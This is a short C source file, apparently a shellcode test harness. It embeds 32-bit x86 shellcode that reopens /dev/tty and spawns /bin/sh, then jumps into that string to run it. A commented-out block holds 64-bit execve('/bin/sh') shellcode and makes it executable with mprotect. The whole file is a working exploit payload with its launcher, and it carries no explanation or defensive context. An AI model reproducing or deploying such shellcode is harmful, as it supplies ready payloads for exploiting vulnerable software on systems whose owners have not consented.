#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char *shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(void)
{
   (*(void(*)()) shellcode)(); 
   printf("Len = %d\n", sizeof(shellcode)-1);
   return 0;
}
/*
char code[] = 
"\x48\x31\xd2" 
"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
"\x48\xc1\xeb\x08"
"\x53"
"\x48\x89\xe7"
"\x50" 
"\x57"
"\x48\x89\xe6"
"\xb0\x3b"
"\x0f\x05";
int main(int argc, char **argv)
{
  mprotect((void*) code, sizeof(code), PROT_READ | PROT_WRITE | PROT_EXEC);
   int (*func)();
   func = (int (*)()) code;
  (int)(*func)();
  return 0;
}
*/
